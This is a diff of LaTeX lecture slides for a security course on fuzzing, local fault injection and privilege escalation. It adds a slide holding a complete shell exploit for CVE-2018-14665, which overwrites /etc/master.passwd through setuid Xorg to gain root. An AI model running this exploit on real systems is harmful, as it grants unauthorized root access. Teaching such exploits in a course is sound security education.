@@ -21,7 +21,7 @@
 \end{list2}
 \item Exercises
 \begin{list2}
-\item Try running brute force and fuzzing
+\item Try Wireshark for decoding protocols
 \item Try American fuzzy lop http://lcamtuf.coredump.cx/afl/
 \end{list2}
 \end{list1}
@@ -126,6 +126,7 @@ by James Forshaw December 2017, 336 pp. ISBN-13: 9781593277505
 
 \url{https://nostarch.com/networkprotocols}
 
+\exercise{ex:wireshark-install}
 
 \slide{Use Developer Libraries}
 
@@ -138,7 +139,6 @@ This goes for:
 \item DNS - Domain Name System, a binary protocol
 \item HTTP with encryption, compression, WSDL, REST, XML-RPC etc.
 \item Open source libraries with different file types
-\item
 \end{list2}
 
 
@@ -149,8 +149,9 @@ The book describes in AoST chapter 11: Local Fault Injection, how to send data t
 \begin{list2}
 \item command line, environment variables, interprocess communication, shared memory, config files, input files, registry keys and system settings
 \item Also the book notes, the kernels running may be vulnerable
-\item
-\item
+\item Both Windows and Unix have similar features, that can be abused
+\item Goal is usually command execution, and privilege escalation
+\item When you have a foothold and can execute commands, you can often find local exploits for kernel or drivers
 \end{list2}
 
 \slide{Attacking Local Applications}
@@ -164,14 +165,70 @@ The book describes in AoST chapter 11: Local Fault Injection, how to send data t
 \end{list2}
 
 
+\slide{CVE-2018-14665 Multiple Local Privilege Escalation}
+
+\begin{alltt}\footnotesize
+#!/bin/sh
+# local privilege escalation in X11 currently
+# unpatched in OpenBSD 6.4 stable - exploit
+# uses cve-2018-14665 to overwrite files as root.
+# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
+# and vulnerable in default OpenBSD.
+# - https://hacker.house
+echo [+] OpenBSD 6.4-stable local root exploit
+cd /etc
+Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
+ -logfile master.passwd :1 &
+sleep 5
+pkill Xorg
+echo [-] dont forget to mv and chmod /etc/master.passwd.old back
+echo [+] type 'Password1' and hit enter for root
+su -
+\end{alltt}
+Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}
+
+\begin{list2}
+\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
+\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}
+
+%\item Example exploit method, write cron job - wait for shell:\\
+%\url{https://www.exploit-db.com/exploits/45742}
+\end{list2}
+
+
+
 \slide{Fuzzing File Formats}
+
+
 
 \begin{list2}
 \item Lots of applications open files, and some are not designed for safety and security
 \item File formats are also complex and difficult to parse
-\item
-
+\item Files served over HTTP is no exception
+\item Browsers have been susceptible to various attacks from the start
+\item We have seen problems with ActiveX components, as described in book
+\item Also Java has had a lot of problems over the years - JRE 617 vulnerabilities 2010 - 2019\\
+\url{https://www.cvedetails.com/product/19117/Oracle-JRE.html?vendor_id=93}
+\item Adobe Flash player - 1075 vulnerabilities 2005 - 2019\\
+\url{https://www.cvedetails.com/product/6761/Adobe-Flash-Player.html?vendor_id=53}
+\item Adobe Acrobat Reader PDF - 681 vulnerabilities from 1999 to 2018!\\ \url{https://www.cvedetails.com/product/497/Adobe-Acrobat-Reader.html?vendor_id=53}
 \end{list2}
+
+\slide{Pwn2Own - attacking browsers}
+
+\begin{quote}
+Contest 2015–2018
+In 2015,[61] every single prize available was claimed.
+
+In 2016, Chrome, Microsoft Edge and Safari were all hacked.[62] According to Brian Gorenc, manager of Vulnerability Research at HPE, they had chosen not to include Firefox that year as they had "wanted to focus on the browsers that [had] made serious security improvements in the last year".[63]
+
+In 2017, Chrome did not have any successful hacks (although only one team attempted to target Chrome), the subsequent browsers that best fared were, in order, Firefox, Safari and Edge.[64]
+
+In 2018, the conference was much smaller and sponsored primarily by Microsoft. Shortly before the conference, Microsoft had patched several vulnerabilities in Edge, causing many teams to withdraw. Nevertheless, certain openings were found in Edge, Safari, Firefox and more.[65] No hack attempts were made against Chrome,[66][67] although the reward offered was the same as for Edge.[68] While many Microsoft products had large rewards available to anyone who was able to gain access through them, only Edge was successfully exploited.
+\end{quote}
+
+Pwn2Own
+\url{https://en.wikipedia.org/wiki/Pwn2Own}
 
 
 \slide{Example Linux Kernel Vulnerabilities}
@@ -181,6 +238,8 @@ This link is for: Linux » Linux Kernel : Security Vulnerabilities (CVSS score >
 
 {\footnotesize\url{https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-9/cvssscoremax-/Linux-Linux-Kernel.html}}
 
+Linux Kernel 2308 vulnerabilities from 1999 to 2019\\
+\url{https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33}
 
 \slide{Linux Kernel Fuzzing}
 
@@ -191,52 +250,9 @@ This link is for: Linux » Linux Kernel : Security Vulnerabilities (CVSS score >
 \url{https://www.x41-dsec.de/de/lab/blog/kernel_userspace/}
 \end{list2}
 
-
-\slide{Web fuzzing}
-
-\begin{list2}
-\item
-\item
-\item
-\item
-\end{list2}
-
-\slide{Hvad er WebScarab}
-
-\hlkimage{5cm}{images/webscarab_logo.png}
-
-\begin{list1}
-\item WebScarab er et framework
-\item Men de fleste vil nok kalde det et værktøj
-\item Fungerer basalt set som en proxy med mere, meget mere
-\item Hjælper med sikkerhedstest af webapplikationer
-\end{list1}
-
-\slide{WebScarab features}
-
-\begin{list1}
-\item Analyse af HTTP(S) requests
-\item Analyse af URL opbygning
-\item Spidering, enumerating
-\item Bypass client-side validation, javascript validering p<E5> klient
-\item Undersøge Session IDs, er de tilfældige
-\end{list1}
+We will go through this article
 
 
-\slide{Installation}
-
-\begin{list1}
-\item WebScarab er et Java program - run anywhere
-\item WebScarab findes i to versioner
-\item Den \emph{gamle klassiske} og den nye webscarab-ng
-\item Den klassiske downloades i en færdig Java JAR pakke
-\item Den nye er en Java Webstart pakke
-\item Den klassiske er fin og virker\\
-\link{http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project}
-\item Den nye er under udvikling og er indimellem lidt bøvlet\\
-\link{http://www.owasp.org/index.php/OWASP_WebScarab_NG_Project}\\
-\link{http://dawes.za.net/rogan/webscarab/WebScarab.jnlp}
-\end{list1}
 
 
 \slide{Example fuzzers}
@@ -250,9 +266,10 @@ american fuzzy lop's source code is published on GitHub. Its name is a reference
 \begin{list2}
 \item Several books and web sites are dedicated to fuzzing, one such:\\ \url{http://www.fuzzing.org/}
 \item \url{https://en.wikipedia.org/wiki/American_fuzzy_lop_(fuzzer)}
-\item
-\item
 \end{list2}
+
+
+\exercise{ex:american-fuzzy-lop}
 
 
 \slide{Determining Exploitability}
@@ -356,9 +373,6 @@ på Unix, over netværket.
 \end{list2}
 
 
-
-\exercise{ex:brute-force-fuzzing}
-\exercise{ex:american-fuzzy-lop}
 
 
 
